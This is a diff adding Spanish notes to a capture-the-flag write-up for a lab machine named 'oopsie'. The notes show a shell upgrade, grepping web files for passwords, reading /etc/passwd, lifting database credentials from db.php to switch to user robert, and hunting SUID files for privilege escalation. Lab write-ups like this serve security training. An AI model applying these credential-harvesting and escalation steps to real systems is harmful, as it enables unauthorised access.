@@ -15,3 +15,18 @@
 
 - con python3 -c 'import pty;pty.spawn("/bin/bash")' dejamos sfuncional la terminal.
 - VAmos al directorio personal y pillamos la flag.
+- cat * | grep -i passw* -> en el directorio /var/www/html/cdn-cgi/login y buscamos por contraseñas encontramos MEGACORP_4dm1n!!
+- cat /etc/passwd para ver todos los users
+
+- Al leer cat db.php
+<?php
+$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+?>
+www-data@oopsie:/var/www/html/cdn-cgi/login$ 
+
+encontramos pw de robert -> su robert
+
+robert@oopsie:/$ id
+id
+uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+robert@oopsie:/$  -> find / -group bugtracker 2>/dev/null vemos que el archivo tiene un SUID.
